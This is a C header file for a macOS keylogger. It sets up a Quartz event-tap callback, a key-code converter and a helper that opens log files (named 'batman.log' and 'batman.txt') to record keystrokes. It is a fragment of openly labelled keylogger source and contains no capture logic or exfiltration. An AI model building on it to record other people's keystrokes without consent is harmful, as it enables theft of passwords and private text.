#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <sys/types.h>
#include <sys/time.h>
#include <stdbool.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include "utils.h"
#include <time.h>
#include "keys.h"

FILE *logfile = NULL;
FILE *cleanfile = NULL;
const char *logfileLocation = "../log/batman.log";
const char *cleanfileLocation = "../log/batman.txt";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
const char *convertKeyCode(int, bool, bool);

FILE* open_file(FILE *file, const char *location) {
	file = fopen(location, "a");
	if (!file) {
		file = fopen(location, "w");
	}

	if (!file) {
    fprintf(stderr, "ERROR: Unable to open %s for writing, check permissions.\n", location);
    exit(1);
  };

	return file;
};

#endif
